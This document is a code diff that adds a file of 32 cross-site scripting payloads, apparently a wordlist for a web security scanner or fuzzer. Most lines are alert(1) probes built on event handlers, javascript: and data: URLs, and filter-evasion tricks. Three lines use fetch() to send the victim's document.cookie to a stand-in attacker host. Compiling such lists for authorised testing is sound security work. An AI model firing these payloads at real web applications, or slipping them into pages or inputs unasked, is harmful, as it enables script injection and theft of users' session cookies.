@@ -1,0 +1,32 @@
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set onbegin=alert(1) attributename=x>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><button>test</button></form>
+<svg><script>alert(1)</script></svg>
+<img src=x onerror="fetch('http://attacker/'+document.cookie)">
+<svg onload="fetch('http://attacker/'+document.cookie)">
+<script>fetch('http://attacker/'+document.cookie)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text>x</text></a></svg>
+<base href="javascript:alert(1)//">
+<svg><script xlink:href="data:,alert(1)"/>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
